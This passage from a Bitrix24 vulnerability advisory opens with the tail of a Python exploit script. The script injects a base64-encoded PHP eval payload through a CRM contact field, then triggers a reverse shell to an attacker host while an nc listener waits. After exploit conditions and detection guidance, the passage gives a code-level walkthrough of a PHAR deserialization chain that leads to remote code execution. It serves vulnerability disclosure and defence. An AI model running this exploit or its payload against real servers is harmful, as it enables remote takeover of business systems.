</span></span><span class="line"><span class="cl">        <span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/bitrix/services/main/ajax.php?action=crm.api.entity.processDeletion&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;X-Bitrix-Csrf-Token&#34;</span><span class="p">:</span> <span class="n">sessid</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;params[hash]=</span><span class="si">{</span><span class="nb">hash</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Contact </span><span class="si">{</span><span class="n">contactId</span><span class="si">}</span><span class="s2"> deleted&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_contact</span><span class="p">(</span><span class="n">session</span><span class="p">:</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">,</span> <span class="n">sessid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&lt;?php eval(base64_decode(&#39;</span><span class="si">{</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">CODE_TO_INJECT</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&#39;)) ?&gt;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">HOST</span> <span class="o">+</span> <span class="s2">&#34;/bitrix/components/bitrix/crm.contact.details/ajax.php?sessid=&#34;</span> <span class="o">+</span> <span class="n">sessid</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;PARAMS[NAME_TEMPLATE]&#34;</span><span class="p">:</span> <span class="s2">&#34;#NAME# #LAST_NAME#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;PARAMS[CATEGORY_ID]&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;EDITOR_CONFIG_ID&#34;</span><span class="p">:</span> <span class="s2">&#34;contact_details&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;HONORIFIC&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;LAST_NAME&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;NAME&#34;</span><span class="p">:</span> <span class="s2">&#34;Definitely not Attacker&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;SECOND_NAME&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;BIRTHDATE&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;POST&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;PHONE[n0][VALUE]&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;PHONE[n0][VALUE_TYPE]&#34;</span><span class="p">:</span> <span class="s2">&#34;WORK&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;EMAIL[n0][VALUE]&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;EMAIL[n0][VALUE_TYPE]&#34;</span><span class="p">:</span> <span class="s2">&#34;WORK&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;WEB[n0][VALUE]&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;WEB[n0][VALUE_TYPE]&#34;</span><span class="p">:</span> <span class="s2">&#34;WORK&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;IM[n0][VALUE]&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;IM[n0][VALUE_TYPE]&#34;</span><span class="p">:</span> <span class="s2">&#34;FACEBOOK&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;CLIENT_DATA&#34;</span><span class="p">:</span> <span class="s2">&#34;{</span><span class="se">\&#34;</span><span class="s2">COMPANY_DATA</span><span class="se">\&#34;</span><span class="s2">:[]}&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;TYPE_ID&#34;</span><span class="p">:</span> <span class="s2">&#34;CLIENT&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;SOURCE_ID&#34;</span><span class="p">:</span> <span class="s2">&#34;CALL&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;SOURCE_DESCRIPTION&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;OPENED&#34;</span><span class="p">:</span> <span class="s2">&#34;Y&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;EXPORT&#34;</span><span class="p">:</span> <span class="s2">&#34;Y&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;ASSIGNED_BY_ID&#34;</span><span class="p">:</span> <span class="s2">&#34;3&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;COMMENTS&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;contact_0_details_editor_comments_html_editor&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;ACTION&#34;</span><span class="p">:</span> <span class="s2">&#34;SAVE&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;ACTION_ENTITY_ID&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;ACTION_ENTITY_TYPE&#34;</span><span class="p">:</span> <span class="s2">&#34;C&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;ENABLE_REQUIRED_USER_FIELD_CHECK&#34;</span><span class="p">:</span> <span class="s2">&#34;Y&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">contactId</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&#34;&#39;ENTITY_ID&#39;:&#39;([0-9]+)&#39;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Created contact </span><span class="si">{</span><span class="n">contactId</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">contactId</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">reverse_shell</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">HOST</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">TARGET_FILE</span><span class="si">}</span><span class="s2">?ip=</span><span class="si">{</span><span class="n">LHOST</span><span class="si">}</span><span class="s2">&amp;port=</span><span class="si">{</span><span class="n">LPORT</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">proxies</span> <span class="o">=</span> <span class="n">PROXY</span>
</span></span><span class="line"><span class="cl">    <span class="n">sessid</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">USERNAME</span><span class="p">,</span> <span class="n">PASSWORD</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">contactId</span> <span class="o">=</span> <span class="n">create_contact</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">sessid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">set_progress_data</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">sessid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">trigger_file_append</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">sessid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">delete_contact</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">sessid</span><span class="p">,</span> <span class="n">contactId</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">reverse_shell</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Waiting for reverse shell connection&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s2">&#34;nc&#34;</span><span class="p">,</span> <span class="s2">&#34;-nvlp&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">LPORT</span><span class="p">)])</span>
</span></span></code></pre></div><h3 id="exploit-conditions">Exploit Conditions:<a hidden class="anchor" aria-hidden="true" href="#exploit-conditions">#</a></h3>
<p>This vulnerability can be exploited when the attacker has access to the CRM feature and permission to create and export contacts. This level of access may be granted if the user is in the management board group.</p>
<h3 id="detection-guidance">Detection Guidance:<a hidden class="anchor" aria-hidden="true" href="#detection-guidance">#</a></h3>
<p>It is possible to detect the exploitation of this vulnerability by checking if any PHP files have been recently modified. Alternatively, the traffic logs can be examined to check if any of the <code>BITRIX_SM_LAST_SETTINGS</code> cookies sent to the server contain the string <code>filePath</code>.</p>
<h2 id="2-rce-via-phar-deserialization">2. RCE via PHAR deserialization<a hidden class="anchor" aria-hidden="true" href="#2-rce-via-phar-deserialization">#</a></h2>
<h3 id="cvss31-scoring-system-1">CVSS3.1 Scoring System:<a hidden class="anchor" aria-hidden="true" href="#cvss31-scoring-system-1">#</a></h3>
<p><strong>Base Score:</strong> 8.8 (High)
<strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></p>
<table>
<thead>
<tr>
<th><strong>Metric</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Attack Vector (AV)</strong></td>
<td>Network</td>
</tr>
<tr>
<td><strong>Attack Complexity (AC)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>Privileges Required (PR)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>User Interaction (UI)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>Scope (S)</strong></td>
<td>Unchanged</td>
</tr>
<tr>
<td><strong>Confidentiality (C)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Integrity (I)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Availability (A)</strong></td>
<td>High</td>
</tr>
</tbody>
</table>
<h3 id="vulnerability-details-1">Vulnerability Details:<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details-1">#</a></h3>
<p>This report presents information on a PHAR deserialization vulnerability in Bitrix24 which allows an adversary to run arbitrary commands on the affected web server.</p>
<p>It was discovered that the code in <code>bitrix/components/bitrix/crm.contact.list/stexport.ajax.php</code> allows an attacker to call the <code>file_exists</code> function on arbitrary input. This stems from the incorrect assumption that the value returned from <code>CUserOptions::GetOption</code> cannot be controlled by an attacker. When Bitrix is run with PHP version &lt;8, an attacker may use the <code>phar://</code> protocol to load a malicious <code>.phar</code> file, which would lead to Remote Code Execution via PHP Object Injection.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// bitrix/components/bitrix/crm.contact.list/stexport.ajax.php line 127
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nv">$progressData</span> <span class="o">=</span> <span class="nx">CUserOptions</span><span class="o">::</span><span class="na">GetOption</span><span class="p">(</span><span class="s1">&#39;crm&#39;</span><span class="p">,</span> <span class="s1">&#39;crm_stexport_contact&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span> <span class="c1">// [1]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$progressData</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$progressData</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$lastToken</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$progressData</span><span class="p">[</span><span class="s1">&#39;PROCESS_TOKEN&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$progressData</span><span class="p">[</span><span class="s1">&#39;PROCESS_TOKEN&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$isNewToken</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$processToken</span> <span class="o">!==</span> <span class="nv">$lastToken</span><span class="p">);</span> <span class="c1">// [2]
</span></span></span><span class="line"><span class="cl"><span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nv">$isNewToken</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filePath</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filePath</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$progressData</span><span class="p">[</span><span class="s1">&#39;FILE_PATH&#39;</span><span class="p">])</span> <span class="o">?</span> 
</span></span><span class="line"><span class="cl">        <span class="nv">$progressData</span><span class="p">[</span><span class="s1">&#39;FILE_PATH&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// [3]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></div><p>In <code>[1]</code>, the existing progress data for current export process is loaded from user options via <code>CUserOptions::GetOption</code>. We will show in the next section that this value can completely controlled by an attacker.</p>
<p>If the process token in the saved progress data matches that sent in the request, the <code>$isNewToken</code> is set to <code>false</code> and control flow enters the <code>else</code> block. The <code>$filePath</code> variable is initialized from the attacker controlled <code>$progressData</code> object (<code>[3]</code>), along with other variables.</p>
<p>After saved variables are loaded, some checks are performed on the <code>$filePath</code> variable:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// bitrix/components/bitrix/crm.contact.list/stexport.ajax.php line 160
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">)</span> <span class="o">||</span> <span class="nv">$filePath</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span> <span class="o">||</span> <span class="o">!</span><span class="nx">CheckDirPath</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span></code></pre></div><p>The <code>CheckDirPath</code> function calls <code>file_exists</code> on the path, after removing the file name:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// bitrix/modules/main/tools.php lines 2347 to 2370
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">CheckDirPath</span><span class="p">(</span><span class="nv">$path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">//remove file name
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span><span class="p">(</span><span class="nx">mb_substr</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&#34;/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$p</span> <span class="o">=</span> <span class="nx">mb_strrpos</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="s2">&#34;/&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$path</span> <span class="o">=</span> <span class="nx">mb_substr</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$p</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nv">$path</span> <span class="o">=</span> <span class="nx">rtrim</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="s2">&#34;/&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nv">$path</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="c1">//current folder always exists
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="nx">BX_DIR_PERMISSIONS</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">is_dir</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Therefore, an attacker could call the <code>file_exists</code> function with an arbitrary scheme, such as <code>phar://</code>, which could lead to the deserialization of PHP objects that are contained within the <code>phar</code>&rsquo;s metadata. We discuss one example of such an object chain that would lead to RCE.</p>
<p>The <code>PropertiesDialog</code> class, found at <code>bitrix/modules/bizproc/lib/activity/propertiesdialog.php</code>, contains the following <code>__toString</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// lines 402 to 423
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">renderer</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">renderer</span><span class="p">,</span> <span class="nv">$this</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$runtime</span> <span class="o">=</span> <span class="nx">\CBPRuntime</span><span class="o">::</span><span class="na">getRuntime</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$runtime</span><span class="o">-&gt;</span><span class="na">startRuntime</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$runtime</span><span class="o">-&gt;</span><span class="na">executeResourceFile</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">activityFile</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dialogFileName</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">array_merge</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;dialog&#39;</span> <span class="o">=&gt;</span> <span class="nv">$this</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//compatible parameters
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="s1">&#39;arCurrentValues&#39;</span> <span class="o">=&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getCurrentValues</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dialogFileName</span> <span class="o">===</span> <span class="s1">&#39;properties_dialog.php&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;formName&#39;</span> <span class="o">=&gt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getFormName</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="p">),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getRuntimeData</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// lines 471 to 474
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">public</span> <span class="k">function</span> <span class="nf">getRuntimeData</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">runtimeData</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The <code>$runtime-&gt;executeResourceFile</code> function is called. Note that all parameters to this function are attacker controllable as they are either properties of the <code>PropertiesDialog</code> class (<code>$this-&gt;activityFile</code> and <code>$this-&gt;dialogFileName</code>) or are derived from them (<code>$this-&gt;runtimeData</code> via <code>$this-&gt;getRuntimeData()</code>). As an attacker has a PHP object deserialization primitive, they can controll these properties.</p>
<p>The <code>ExecuteResourceFile</code> function performs two checks (<code>[4]</code> and <code>[5]</code>) before calling <code>include</code> on <code>$path[0]</code> (<code>[6]</code>):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// bitrix/modules/bizproc/classes/general/runtime.php lines 571 to 588
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">ExecuteResourceFile</span><span class="p">(</span><span class="nv">$activityPath</span><span class="p">,</span> <span class="nv">$filePath</span><span class="p">,</span> <span class="nv">$arParameters</span> <span class="o">=</span> <span class="k">array</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$path</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">GetResourceFilePath</span><span class="p">(</span><span class="nv">$activityPath</span><span class="p">,</span> <span class="nv">$filePath</span><span class="p">);</span> <span class="c1">// [4]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$path</span> <span class="o">!=</span> <span class="k">null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">ob_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$arParameters</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nv">${$key}</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span> <span class="c1">// [7]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">LoadActivityLocalization</span><span class="p">(</span><span class="nv">$path</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$filePath</span><span class="p">);</span> <span class="c1">// [5]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">include</span><span class="p">(</span><span class="nv">$path</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="c1">// [6]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$result</span> <span class="o">=</span> <span class="nx">ob_get_contents</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nx">ob_end_clean</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>It was determined that setting <code>$activityPath</code> to <code>null</code> and <code>$filePath</code> to <code>stexport.php</code> would allow both checks to pass. However, the value of <code>$path[0]</code> would be <code>stexport.php</code> and not an attacker controlled location.</p>
<p>However, the code at <code>[7]</code>, which sets each property of the attacker controlled <code>$arParameters</code> variable as a local variable, allows an attacker to override the <code>$path</code> variable after the completion of the first check but before the second check. This allows an attacker to modify <code>$path[0]</code> to an attacker controlled path.</p>
